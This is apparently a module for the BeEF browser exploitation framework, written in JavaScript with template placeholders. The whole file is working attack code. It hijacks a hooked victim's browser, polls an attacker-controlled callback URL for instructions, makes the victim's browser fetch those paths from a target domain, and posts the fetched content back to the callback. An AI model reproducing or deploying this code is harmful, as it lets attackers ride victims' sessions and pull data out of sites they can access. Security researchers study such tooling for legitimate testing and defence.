beef.execute(function() {
    var domain = "<%= @domain %>"
    if (window.location.href.indexOf(domain) == -1) {
       window.location.href = "http://"+domain+"/";
    } else {
        //Cut '/' from url
        var url = window.location.href.slice(0, -1);
        var url_callback = "<%= @url_callback %>";
        url_callback += '/?from=from_victim&&';

        function get_next_query() {
                var xhr_callback = new XMLHttpRequest();
                //Synchronous because we do nothing without query from BeEF owner
                xhr_callback.open('GET', url_callback+'que=req', true);
                xhr_callback.onload = resolv_query;
                xhr_callback.send(null);
        }

        function resolv_query() {
                var path = this.getResponseHeader('path');
                var method = this.getResponseHeader('method');
                var data = this.responseText;

                //Asynchronous beacuse XHR2 don't work with responseType when synchronous
                var xhr = new XMLHttpRequest();
                xhr.open(method, url+path, true);
                xhr.responseType = 'arraybuffer'
                xhr.onload = function(e) {
                    var blob = new Blob([this.response], {type: this.getResponseHeader('Content-Type')});
                    console.log(blob);
                    xhr_cb = new XMLHttpRequest();
                    xhr_cb.open('POST', url_callback+'que=req&&path='+path, false);
                    xhr_cb.send(blob);

                    elem = document.createElement("div");
                    elem.id = 'log';
                    elem.innerHTML = 'Downloaded: '+path;
                    document.body.insertBefore(elem, document.body.childNodes[0]);
                }
                xhr.send(data);
        }

        xhr1 = new XMLHttpRequest();
        xhr1.open('GET', url+'/?load', false);
        xhr1.send(null);
        if (xhr1.status == 200) {
            setInterval(get_next_query, 1000);
        }

    }
});
